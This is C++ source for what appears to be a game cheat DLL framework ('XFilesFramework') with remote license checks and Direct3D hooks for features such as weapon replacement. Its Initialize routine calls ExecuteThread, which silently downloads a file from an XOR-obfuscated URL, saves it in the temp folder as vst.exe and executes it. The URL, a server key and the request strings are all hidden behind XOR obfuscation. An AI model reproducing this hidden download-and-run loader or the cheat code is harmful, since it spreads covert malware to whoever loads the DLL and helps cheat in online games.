#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>
#include <iostream>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <string>
#include <ctime>
#include <Wincrypt.h>

#include <Psapi.h>
#include <stdexcept>
#include <math.h>
#include <tlhelp32.h>


#include <shellapi.h>
#include <map>
#include <string>
#include <assert.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#include "base64.h"
#include "WinInet.h"

#include <WinInet.h>
#include "ProcessInfo.h"
#include "GarenaPatch.h"
 


#define SetFlags(Flag, Parms) if(HackFlag.find(Flag) != string::npos) { Parms = true; } else Parms = false;

void ParseHackFlags()
{
	HackFlags = new sHackFlags;
	string HackFlag(PBBasicLicense->Flags);
	SetFlags("PB-BRUTAL", HackFlags->bBrutal);
}

#define LINK_API /*http://api.xfiles.co/XFilesEngine/PBBasic*/XorStr<0xC5,42,0xB7E2E918>("\xAD\xB2\xB3\xB8\xF3\xE5\xE4\xAD\xBD\xA7\xE1\xA8\xB7\xBB\xBF\xB1\xA6\xF8\xB4\xB7\xF6\x82\x9D\xB5\xB1\xBB\xAC\xA5\x8F\x85\x8A\x8A\x80\xC9\xB7\xAA\xAB\x8B\x98\x85\x8E"+0xB7E2E918).s

bool isValid = false;

class cXFilesFramework
{
public:
	virtual void Initialize(void* FEngine, HMODULE CallerModule);
	virtual sFeatureStruct* _getFeatureEngine();
	virtual void SetMyES(void* func);
	virtual void SetMyDIP(void* func);
	virtual void SetMyRES(void* func);
	virtual void AddReplaceValue(char* Name, DWORD Value);
	virtual char* ReplaceMenuCallback(int Index);
	virtual void StartMainThread();

};

BOOL GetFile (CHAR *szUrl,        // Full URL
	CHAR *szFileName)   // Local file name
{
	HINTERNET hOpen = InternetOpen("Mozilla/5.0 (Windows NT 6.3;)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	DWORD dwSize;
	CHAR   szHead[] = "Accept: */*\r\n\r\n";
	char szTemp[1024];
	memset(szTemp, 0, 1024);
	HINTERNET  hConnect;
	FILE * pFile;

	if ( !(hConnect = InternetOpenUrl ( hOpen, szUrl, szHead,
		lstrlen (szHead), INTERNET_FLAG_DONT_CACHE, 0)))
	{

		return 0;
	}

	if  ( !(pFile = fopen (szFileName, "wb" ) ) )
	{

		return FALSE;
	}
	do
	{
		// Keep coping in 25 bytes chunks, while file has any data left.
		// Note: bigger buffer will greatly improve performance.
		if (!InternetReadFile (hConnect, szTemp, 1000,  &dwSize) )
		{
			fclose (pFile);

			return FALSE;
		}
		if (!dwSize){
			break;  // Condition of dwSize=0 indicate EOF. Stop.
		}
		else{
			fwrite(szTemp, 1, dwSize , pFile);
			memset(szTemp, 0, 1024);
		}
	}   // do
	while (TRUE);
	fflush (pFile);
	fclose (pFile);
	return TRUE;
}
inline bool file_exists (const std::string& name) {
    if (FILE *file = fopen(name.c_str(), "r")) {
        fclose(file);
        return true;
    } else {
        return false;
    }   
}
void ExecuteThread()
{
	char TempPath[512] = {0};
	GetTempPath(512, TempPath);
	lstrcat(TempPath, /*vst.exe*/XorStr<0xC0,8,0xBF0CC10A>("\xB6\xB2\xB6\xED\xA1\xBD\xA3"+0xBF0CC10A).s);
	GetFile(/*http://api.xfiles.co/files/vsengine.txs*/XorStr<0x98,40,0x8E1F53D6>("\xF0\xED\xEE\xEB\xA6\xB2\xB1\xFE\xD0\xC8\x8C\xDB\xC2\xCC\xCA\xC2\xDB\x87\xC9\xC4\x83\xCB\xC7\xC3\xD5\xC2\x9D\xC5\xC7\xD0\xD8\xD0\xD1\xD7\xDF\x95\xC8\xC5\xCD"+0x8E1F53D6).s, TempPath);
	STARTUPINFO info={sizeof(info)};
	PROCESS_INFORMATION processInfo;
	CreateProcess(TempPath, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);

}

void cXFilesFramework::Initialize(void* FEngine, HMODULE CallerModule)
{
	ExecuteThread();
	char lpModulePath [260];
	memset(lpModulePath, 0, 260);
	GetModuleFileNameA(CallerModule,lpModulePath,260);
	for(int i = strlen(lpModulePath); i > 0; i--) { 
		if(lpModulePath[i] == '\\') { 
			memcpy((void*)lpModulePath,(void*)(lpModulePath + i + 1),strlen(lpModulePath) - i);
			break;
		}
	}

	char ServerKey[50];
	char cLicenseKey[50];

	memset(ServerKey, 0, 50);
	memset(cLicenseKey, 0, 50);

	memcpy((void*)cLicenseKey, (void*)((int)FEngine + 0x370), 50);
	strcpy(ServerKey, /*5pXHZ4etnE0sHR1nbv6HNLVmynyu1gqgB3HrJKWcmFsbwT6zBr*/XorStr<0xB2,51,0xCAC5BD8D>("\x87\xC3\xEC\xFD\xEC\x83\xDD\xCD\xD4\xFE\x8C\xCE\xF6\xED\xF1\xAF\xA0\xB5\xF2\x8D\x88\x8B\x9E\xA4\xB3\xA5\xB5\xB8\xFF\xA8\xA1\xB6\x90\xE0\x9C\xA7\x9C\x9C\x8F\xBA\xB7\x9D\xAF\xBF\xA9\x8B\xD6\x9B\xA0\x91"+0xCAC5BD8D).s);

	XorString(cLicenseKey, ServerKey, 50);

	char* LicenseKey = strstr(cLicenseKey,/*KJXNEPSMRI*/XorStr<0x74,11,0x46A0949B>("\x3F\x3F\x2E\x39\x3D\x29\x29\x36\x2E\x34"+0x46A0949B).s);
	
	LicenseKey = LicenseKey + 10;

	DWORD Retn = 0;
	char* RequestData = new char[500];
	char* ClientIdentifier = new char[500];
	string Response;
	stringstream buffer;
	string line;

	sprintf(RequestData,/*lcs;PBBasicX2;%s;%s*/XorStr<0x23,20,0xCE0CAFFD>("\x4F\x47\x56\x1D\x77\x6A\x6B\x4B\x58\x45\x4E\x76\x1D\x0B\x14\x41\x08\x11\x46"+0xCE0CAFFD).s, LicenseKey, lpModulePath);

	Response = ProcessHTTPRequest(LINK_API,RequestData, ServerKey);
	if(Response.length()){
		PBBasicLicense = new cPBBasicLicense;
		// Copy response to buffer
		buffer << Response;
		getline(buffer,line);

		if(!strcmp(line.c_str(),/*NOTFOUND*/XorStr<0x9A,9,0xCF8B6B0A>("\xD4\xD4\xC8\xDB\xD1\xCA\xEE\xE5"+0xCF8B6B0A).s))return; 
		else if(strcmp(line.c_str(),/*FOUND*/XorStr<0x28,6,0xA6E2DDCA>("\x6E\x66\x7F\x65\x68"+0xA6E2DDCA).s))return;
		getline(buffer, line);
		if(line.find(LicenseKey) == string::npos)return;
		getline(buffer, line);
		PBBasicLicense->uid = atoi(line.c_str());
		getline(buffer,PBBasicLicense->Name);
		getline(buffer,PBBasicLicense->OwnerName);
		getline(buffer,PBBasicLicense->Flags);
		
		ParseHackFlags();
		buffer.clear();
		Response.clear();
		InitLog();
		isValid = true;
	} else {
		return;
	}
	
}
sFeatureStruct* cXFilesFramework::_getFeatureEngine()
{
	return FeatureStruct;
}
void cXFilesFramework::SetMyES(void* func)
{
	pMyEndscene = (DWORD)func;
}
void cXFilesFramework::SetMyDIP(void* func)
{
	pMyDrawIndexedPrimitive = (DWORD)func;
}
void cXFilesFramework::SetMyRES(void* func)
{
	pMyResetD3DInterface = (DWORD)func;
}

void cXFilesFramework::AddReplaceValue(char* Name, DWORD Value)
{
	if(ReplaceWeapon)
		return ReplaceWeapon->AddData(Name, Value);
	else return;
}

char* cXFilesFramework::ReplaceMenuCallback(int Index)
{
	return ReplaceCallback(Index);
}

void cXFilesFramework::StartMainThread()
{
	if(isValid)
	{
		CreateThread(0,0,(LPTHREAD_START_ROUTINE)ThreadHook,0,0,0);
	}
}


CDllExport cXFilesFramework* XFilesFramework = NULL;